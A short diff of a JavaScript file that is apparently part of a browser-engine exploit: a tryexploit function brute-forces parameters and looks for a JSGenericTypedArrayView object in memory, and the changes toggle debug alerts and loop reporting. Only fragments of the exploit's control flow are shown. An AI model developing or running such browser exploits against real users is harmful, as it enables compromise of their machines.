@@ -48,7 +48,7 @@ function tryexploit(a_c, p_c){
 			//alert("Exploit Failed.");
 			return 0;
 		} else {
-			alert("Exploit Worked.");
+			//alert("Exploit Worked.");
 			return 1;
 			
 			for (x = attempts.length - 1; x >= 1; x--) 
@@ -59,6 +59,7 @@ function tryexploit(a_c, p_c){
 					{
 						memory_view = attempts[x];
 						alert("Found JSGenericTypedArrayView");
+						alert("tryexploit: a_c=" + a_c + ", p_c=" + p_c);
 						return 1;
 						break;
 					}
@@ -81,8 +82,9 @@ function tryexploit(a_c, p_c){
 
 for(pc=0; pc<100; pc++){
 	for(ac=0; ac < 4250000 ; ac += 1000){
-		if(tryexploit(ac, pc) == 1){
-			alert("Exploit worked! ac=" + ac + ", pc=" + pc);
-		}
+		tryexploit(ac, pc);
+		//if(tryexploit(ac, pc) == 1){
+		//	alert("Exploit worked! ac=" + ac + ", pc=" + pc);
+		//}
 	}
 }
